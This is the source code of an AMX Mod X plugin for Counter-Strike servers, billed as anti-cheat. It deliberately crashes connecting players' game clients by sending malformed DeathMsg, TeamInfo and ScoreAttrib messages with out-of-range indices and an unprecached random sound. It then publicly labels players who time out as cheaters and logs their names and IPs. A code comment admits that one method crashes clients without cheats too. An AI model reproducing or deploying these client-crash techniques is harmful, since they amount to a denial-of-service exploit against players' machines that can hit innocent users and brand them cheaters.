#include <amxmodx>
#include <amxmisc>
#include <reapi>

new const Plugin_sName[] = "Unreal Cheater Cry";
new const Plugin_sVersion[] = "1.5";
new const Plugin_sAuthor[] = "Karaulov";

new g_sUserNames[MAX_PLAYERS + 1][33];
new g_sUserIps[MAX_PLAYERS + 1][33];
new bool:g_bUserWait[MAX_PLAYERS + 1] = {false,...};
new bool:g_bUserCrash[MAX_PLAYERS + 1] = {false,...};
new Float:g_fUserWait[MAX_PLAYERS + 1] = {0.0,...};
new g_iCrashOffset[MAX_PLAYERS + 1][7];

new g_sCrashSound[64];

// Настройки
//#define UNSAFE_METHODS_FOR_STEAM
#define SET_MISSING_SOUND

// Начало запуска плагина
public plugin_init()
{
// Регистрация плагина, название версия и автор
	register_plugin(Plugin_sName, Plugin_sVersion, Plugin_sAuthor);
// Регистрация серверного квара что бы можно было найти все сервера с этим хорошим плагином
	register_cvar("unreal_cheater_cry", Plugin_sVersion, FCVAR_SERVER | FCVAR_SPONLY);
// Регистрация пакетов движения простого и движения в воздухе
	RegisterHookChain(RG_PM_Move, "PM_Move", .post = false);
}

public plugin_precache()
{
	new tmpString[64];
	RandomString(tmpString, 20);
	formatex(g_sCrashSound, 64, "player/%s.wav", tmpString);
	precache_sound(g_sCrashSound);
}

// Игрок начинает подключение к серверу
public client_connectex(id, const name[], const ip[], reason[128])
{   
// При подключении клиента сохраняем его никнейм и айпишник
	copy(g_sUserNames[id],charsmax(g_sUserNames[]), name);
	copy(g_sUserIps[id],charsmax(g_sUserIps[]), ip);
	
// При подключении клиента удаляем все таски с номером игрока
	if(task_exists(id))
		remove_task(id);
	if(task_exists(id + 1000))
		remove_task(id + 1000);
		
// Установить флаг проверки в false
	g_bUserWait[id] = false;
	g_bUserCrash[id] = false;
	
	return PLUGIN_CONTINUE;
}


// Если игрок прислал пакет MOVE, то его не выкинуло. 
// Установить флаг проверки в false
public PM_Move(const id)
{
	if ( id >= 1 && id <= MaxClients )
	{
		if (g_bUserWait[id] && get_gametime() - g_fUserWait[id] > 0.7)
		{
			g_bUserWait[id] = false;
		}
		if (g_bUserCrash[id])
		{                
			g_bUserCrash[id] = false;

			
			for(new i = 0; i < sizeof(g_iCrashOffset[]); i++)
			{
				g_iCrashOffset[id][i] = 33;
			}
			
			set_task(0.01,"do_crash",id + 1000);

			g_bUserWait[id] = true;
			g_fUserWait[id] = get_gametime();
		}
	}
}

public do_crash(idx)
{
	new id = idx - 1000;

	if (!is_user_connected(id))
		return;

	if (!make_cheater_cry_method1(id) &&
		!make_cheater_cry_method2(id) &&
		// Закомментированные методы вызывают ложные на некоторых протекторах:
		// !make_cheater_cry_method3(id) &&
		// !make_cheater_cry_method4(id) &&
		!make_cheater_cry_method6(id) &&
		!make_cheater_cry_method5(id))
	{
		if (is_user_connected(id))
		{
			client_cmd(id, "clear");
		}
		return;
	}
	set_task(0.01,"do_crash",id + 1000);
}

// Игрок подключился к серверу
public client_putinserver(id)
{
	if (is_user_hltv(id) || is_user_bot(id)) return;
	
// Установить флаг проверки в false
	g_bUserWait[id] = false;
	g_bUserCrash[id] = false;
	
// При подключении клиента удаляем все таски с номером игрока
	if(task_exists(id))
		remove_task(id);
	if(task_exists(id + 1000))
		remove_task(id + 1000);
		
// Запускаем две попытки краша, сразу, и через несколько минут
// если читер включает чит не перед игрой
	g_bUserCrash[id] = true;

	set_task(random_float(60.0,500.0),"start_make_cheater_cry",id);
}

// Игрок отключился от сервера
public client_disconnected(id, bool:drop, message[], maxlen)
{
// При отключении клиента удаляем все таски с номером игрока
	if(task_exists(id))
		remove_task(id);
	if(task_exists(id + 1000))
		remove_task(id + 1000);

	if (drop && equal(message,"Timed out") && g_bUserWait[id])
	{
		client_print_color(0,print_team_blue, "^3[CHEATER_CRY]^1 Игрок ^4%s^3 попытался войти с читом...Но не смог :)", g_sUserNames[id]);
		log_to_file("unreal_cheater_cry.log","Игрок %s [IP:%s] попытался войти с читом...", g_sUserNames[id],g_sUserIps[id]);
	}
 
	g_bUserWait[id] = false;
	g_bUserCrash[id] = false;
}

// Функция краша использующая 5 различных метода которые должны вызвать падения 
// если используются модификации клиента (чит программы)
public start_make_cheater_cry(id)
{
	if (is_user_connected(id))
	{
		//Сделать краш игрока если он подаст "признаки жизни"
		g_bUserCrash[id] = true;
	}
}

public bool:make_cheater_cry_method1(id)
{
	if (!is_user_connected(id))
		return false;

	static deathMsg = 0;

	if ( deathMsg == 0 )
		deathMsg = get_user_msgid ( "DeathMsg" );

	new deathMax = 65;
#if defined UNSAFE_METHODS_FOR_STEAM
	if (is_user_steam(id))
	{	
		deathMax = 255;
	}
#endif

	if (g_iCrashOffset[id][1] >= deathMax)
	{
		return false;
	}

	for(new i = 0; i <= 5; i++)
	{
		if (g_iCrashOffset[id][1] >= 65)
		{
			if (deathMax == 255)
			{
				g_iCrashOffset[id][1] = 1000;
				message_begin( MSG_ONE, deathMsg, _,id );
				write_byte( id );
				write_byte( 255 );
				write_byte( 0  );
				write_string( "knife" );
				message_end();

				message_begin( MSG_ONE, deathMsg, _,id );
				write_byte( id );
				write_byte( 124 );
				write_byte( 0  );
				write_string( "knife" );
				message_end();

				message_begin( MSG_ONE, deathMsg, _,id );
				write_byte( id );
				write_byte( 125 );
				write_byte( 1 );
				write_string( "deagle" );
				message_end();
			}
			return false;
		}

		if (g_iCrashOffset[id][1] >= 33)
		{
			message_begin( MSG_ONE, deathMsg, _,id );
			write_byte( id );
			write_byte( g_iCrashOffset[id][1] );
			write_byte( 0  );
			write_string( "knife" );
			message_end();
			
			message_begin( MSG_ONE, deathMsg, _,id );
			write_byte( id );
			write_byte( g_iCrashOffset[id][1] );
			write_byte( 1 );
			write_string( "deagle" );
			message_end();

			message_begin( MSG_ONE, deathMsg, _,id );
			write_byte( id );
			write_byte( g_iCrashOffset[id][1] );
			write_byte( 1  );
			write_string( "knife" );
			message_end();

			message_begin( MSG_ONE, deathMsg, _,id );
			write_byte( id );
			write_byte( g_iCrashOffset[id][1] );
			write_byte( 0 );
			write_string( "deagle" );
			message_end();
		}

		g_iCrashOffset[id][1]++;
	}
	return true;
}

public bool:make_cheater_cry_method2(id)
{
	if (!is_user_connected(id))
		return false;

	static teamInfo = 0;

	if ( teamInfo == 0 )
		teamInfo = get_user_msgid ( "TeamInfo" );

	if (g_iCrashOffset[id][2] >= 256)
			return false;

	for(new i = 0; i <= 12; i++)
	{
		if (g_iCrashOffset[id][2] >= 256)
			return false;
		
		if (g_iCrashOffset[id][2] >= 36)
		{
			message_begin( MSG_ONE, teamInfo, _,id );
			write_byte( g_iCrashOffset[id][2]  );
			write_string( "KILL_BAD_CHEATERS_KILL_KILL_KILL_KILL_KILL_KILL" );
			message_end();
		}
		g_iCrashOffset[id][2]++;
	}
	return true;
}

public bool:make_cheater_cry_method3(id)
{
	if (!is_user_connected(id))
		return false;
		
	message_begin( MSG_ONE, SVC_STUFFTEXT, _,id );
	write_string( "" );
	message_end();
	message_begin( MSG_ONE, SVC_STUFFTEXT, _,id );
	write_string( ";" );
	message_end();
	return false;
}

public bool:make_cheater_cry_method4(id)
{
	if (!is_user_connected(id))
		return false;

	message_begin(MSG_ONE, SVC_SPAWNSTATICSOUND, .player = id);
	write_coord_f(random_float(-1000.0,1000.0));
	write_coord_f(random_float(-1000.0,1000.0));
	write_coord_f(random_float(-1000.0,1000.0));
	write_short(511);
	write_byte(255);
	write_byte(255);
	write_short(id == 1 ? 2 : 1); 
	write_byte(255);
	write_byte(0);
	message_end();
   
	message_begin(MSG_ONE, SVC_SPAWNSTATICSOUND, .player = id);
	write_coord_f(random_float(-1000.0,1000.0));
	write_coord_f(random_float(-1000.0,1000.0));
	write_coord_f(random_float(-1000.0,1000.0));
	// Если pich > 0 то краш даже у клиента без читов :)
	write_short(512);
	write_byte(255);
	write_byte(255);
	write_short(id == 1 ? 2 : 1); 
	write_byte(0);
	write_byte(0);
	message_end();
	return false;
}

public bool:make_cheater_cry_method5(id)
{
	if (!is_user_connected(id))
		return false;

	static scoreAttrib = 0;

	if ( scoreAttrib == 0 )
		scoreAttrib = get_user_msgid ( "ScoreAttrib" );

	if (g_iCrashOffset[id][5] >= 256)
			return false;

	for(new i = 0; i <= 12; i++)
	{
		if (g_iCrashOffset[id][5] >= 256)
			return false;
		
		if (g_iCrashOffset[id][5] >= 33)
		{
			message_begin( MSG_ONE, scoreAttrib, _,id );
			write_byte( g_iCrashOffset[id][5] );
			write_byte( 0 );
			message_end();

			message_begin( MSG_ONE, scoreAttrib, _,id );
			write_byte( g_iCrashOffset[id][5] );
			write_byte( 0xF );
			message_end();
		}

		g_iCrashOffset[id][5]++;
	}
	return true;
}

public bool:make_cheater_cry_method6(id)
{
	if (!is_user_connected(id))
		return false;
#if defined SET_MISSING_SOUND
	rh_emit_sound2(id, id, random_num(0,100) > 50 ? CHAN_VOICE : CHAN_STREAM, g_sCrashSound, VOL_NORM, ATTN_NORM);
#endif
	return false;
}

new const g_CharSet[] = "abcdefghijklmnopqrstuvwxyz";

stock RandomString(dest[], length)
{
	new i, randIndex;
	new charsetLength = strlen(g_CharSet);

	for (i = 0; i < length; i++)
	{
		randIndex = random(charsetLength);
		dest[i] = g_CharSet[randIndex];
	}

	dest[length - 1] = EOS;  // Null-terminate the string
}